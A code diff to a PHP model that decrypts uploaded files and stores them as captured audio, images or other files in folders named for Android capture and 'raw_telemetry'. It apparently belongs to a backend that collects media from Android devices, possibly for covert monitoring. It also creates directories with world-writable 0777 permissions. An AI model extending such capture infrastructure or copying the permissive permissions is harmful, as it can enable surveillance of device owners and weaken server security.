@@ -301,7 +301,7 @@ class ParseAdvancedModel extends Model
             $dated = date('Y-m-d H:i:s');
 
             // 1. Read encrypted file
-            $encryptedPath = WRITEPATH . 'uploads/text_dump/' . $file_name;
+            $encryptedPath = WRITEPATH . 'uploads/raw_telemetry/' . $file_name;
             $raw = file_get_contents($encryptedPath);
             if ($raw === false) {
                 log_message('error', '[parse_captured_media] Cannot read: ' . $file_name);
@@ -309,25 +309,65 @@ class ParseAdvancedModel extends Model
             }
 
             // 2. Decrypt
-            $decoded = $cryptModel->decrypt_media($raw);
+            $decoded = $cryptModel->decrypt_file($raw);
             if ($decoded === false) {
                 log_message('error', '[parse_captured_media] Decryption failed for file: ' . $file_name);
                 return false;
             }
 
-            // 3. Determine category and extension
+            // 3. Determine category, extension and mime type
             $category = $type;
-            $extension = ($type === 'audio') ? 'mp3' : 'jpg';
-            $mimeType  = ($type === 'audio') ? 'audio/mpeg' : 'image/jpeg';
+            if ($type === 'audio') {
+                $extension = 'mp3';
+                $mimeType = 'audio/mpeg';
+            } elseif ($type === 'image') {
+                $extension = 'jpg';
+                $mimeType = 'image/jpeg';
+            } else {
+                // It is a downloaded file
+                $mimeType = 'application/octet-stream';
+                $extension = 'bin';
+                if ($fileRecordId) {
+                    $fileRecord = $this->db->table('tbl_uploaded_files')->where('id', $fileRecordId)->get()->getRowArray();
+                    if ($fileRecord) {
+                        $mimeType = $fileRecord['mime_type'] ?: 'application/octet-stream';
+                        $origName = $fileRecord['original_filename'];
+                        // Strip .enc if present
+                        if (str_ends_with(strtolower($origName), '.enc')) {
+                            $origName = substr($origName, 0, -4);
+                        }
+                        $pathInfo = pathinfo($origName);
+                        $extension = $pathInfo['extension'] ?? 'bin';
+                    }
+                }
+            }
 
             // 4. Create storage directory
-            $targetDir = ($type === 'audio') ? WRITEPATH . 'uploads/audio/' : WRITEPATH . 'uploads/captured/';
+            if ($type === 'audio') {
+                $targetDir = WRITEPATH . 'uploads/android_captured_audio/';
+            } elseif ($type === 'image') {
+                $targetDir = WRITEPATH . 'uploads/android_captured_images/';
+            } else {
+                $targetDir = WRITEPATH . 'uploads/android_captured_files/';
+            }
+
             if (!is_dir($targetDir)) {
                 mkdir($targetDir, 0777, true);
             }
 
             // 5. Save decrypted file
-            $newFileName = $category . '_' . time() . '_' . uniqid() . '.' . $extension;
+            if ($type === 'file') {
+                $originalNameClean = 'file_' . time() . '_' . uniqid();
+                if ($fileRecordId && isset($origName)) {
+                    $originalNameClean = pathinfo($origName, PATHINFO_FILENAME);
+                    // sanitize
+                    $originalNameClean = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', $originalNameClean);
+                }
+                $newFileName = $originalNameClean . '_' . time() . '_' . uniqid() . '.' . $extension;
+            } else {
+                $newFileName = $category . '_' . time() . '_' . uniqid() . '.' . $extension;
+            }
+
             $targetPath = $targetDir . $newFileName;
             
             if (file_put_contents($targetPath, $decoded) === false) {
@@ -2860,7 +2900,7 @@ private function decryptIfEncrypted(string $content): ?string
             return null;
         }
 
-        $decoded = $cryptModel->decode_content($raw);
+        $decoded = $cryptModel->decrypt_file($raw);
         if ($decoded === false) {
             log_message('error', '[payloadToArray] Decryption failed: ' . $file_name);
             return null;
